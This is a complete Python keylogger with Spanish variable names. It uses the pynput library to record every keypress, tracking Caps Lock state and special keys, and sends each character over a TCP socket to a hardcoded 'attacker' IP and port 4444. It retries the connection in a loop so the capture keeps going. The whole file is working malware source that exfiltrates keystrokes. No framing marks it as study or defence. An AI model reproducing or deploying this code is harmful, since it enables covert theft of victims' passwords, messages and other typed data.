from pynput import keyboard
import socket
import time

ATACANTE_IP = "10.10.10.5"
ATACANTE_PUERTO = 4444

caps_lock_activo = False

def conectar():
    while True:
        try:
            s = socket.socket()
            s.connect((ATACANTE_IP, ATACANTE_PUERTO))
            return s
        except:
            time.sleep(3)

conexion = conectar()

def al_presionar(tecla):
    global conexion, caps_lock_activo
    
    # Detectar Caps Lock
    if tecla == keyboard.Key.caps_lock:
        caps_lock_activo = not caps_lock_activo
        return
    
    letra = None
    
    if hasattr(tecla, 'char') and tecla.char is not None:
        letra = tecla.char
        if letra.isalpha():
            letra = letra.upper() if caps_lock_activo else letra.lower()
    else:
        if tecla == keyboard.Key.space:
            letra = ' '
        elif tecla == keyboard.Key.enter:
            letra = '\n'
        elif tecla == keyboard.Key.tab:
            letra = '\t'
        elif tecla == keyboard.Key.backspace:
            letra = '\b' 
    
    if letra:
        try:
            conexion.send(letra.encode('utf-8', errors='ignore'))
        except:
            conexion = conectar()
            try:
                conexion.send(letra.encode('utf-8', errors='ignore'))
            except:
                pass

listener = keyboard.Listener(on_press=al_presionar)
listener.start()
listener.join()